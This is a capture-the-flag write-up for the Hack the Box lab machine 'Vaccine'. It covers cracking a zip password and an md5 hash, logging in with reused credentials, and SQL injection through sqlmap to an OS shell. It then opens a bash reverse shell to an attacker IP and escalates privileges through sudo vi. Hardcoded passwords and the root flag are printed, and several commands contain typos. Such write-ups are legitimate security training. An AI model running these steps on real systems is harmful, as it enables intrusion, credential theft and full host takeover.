+++
title = "Hack the Box: Vaccine"
date = 2023-02-12
description = "Hack the Box: Vaccine"
tags = [
    "Hack the Box",
    "Write-up"
]
+++

# Vaccine

## Enumeration

### Nmap

```
#nmap -sC -sV 10.10.10.46    
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-27 16:52 CEST
Nmap scan report for 10.10.10.46
Host is up (0.045s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see an ftp port open, let’s try to connect on it using the credentials got from the last box (Oopsie) `ftpuser / mc@F1l3ZilL4`.

```
# ftp 10.10.10.46
# dir
```

We’re using zip2john to calculate the hash of the archive’s password:

```
sudo zip2john backup.zip > hash
```

Then we pass it into john:

```
sudo john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
```

and we get `741852963` as password. Unzip the archive with it. Open index.php, we find a md5 hash, let’s crack it using hashcat:

```
# hashcat -m 0 2cb42f8734ea607eefed3b70af13bbd3 /usr/share/wordlists/rockyou.txt -O
```

And we get `qwerty789`.

## Foothold

Let’s browse to 10.10.10.46 and try some simple authentication : `admin \ qwerty789` ends by working. We can see that the search argument is passed in the GET request `http://10.10.10.46/dashboard.php?search=a`. Let’s try SQLMap, but first grab the cookie with the firefox console `1qd0d4rp5tne7qj80p4e347t2o`:

```
# sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID:1qd0d4rp5tne7qj80p4e347t2o"
```

We find that it’s possible to do injection and that the backend is a Postgre. Code execution is easy:

```
# sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID:1qd0d4rp5tne7qj80p4e347t2o" --os-shell
```

This can be used to execute a bash reverse shell:

```
# bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'7
```

```
# nc -lvnp 4444
```

It’s also possible to ssh using the first credentials:

```
# ssh ftpuser@10.10.10.467
```

## Privilege Escalation

Upgrade your shell:

```
# SHELL=/bin/bash script -q /dev/null
```

In /var/www/html/dashboard.php we can find this:

```
try {
      $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
    }
```

Now you can: `su postgres` or `ssh postgres@10.10.10.46`

Let’s view the sudo privilege of the user:

```
# python3 -c "import pty;pty.spwn('/bin/bash')"
# sudo -l
```

Run the command from the sudoers file and leverage:

```
# sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
# Edit the file
# :!/bin/bash
# whoami
```

You can now get the flag in /root/root.txt: `dd6e058e814260bc70e9bbdef2715849`
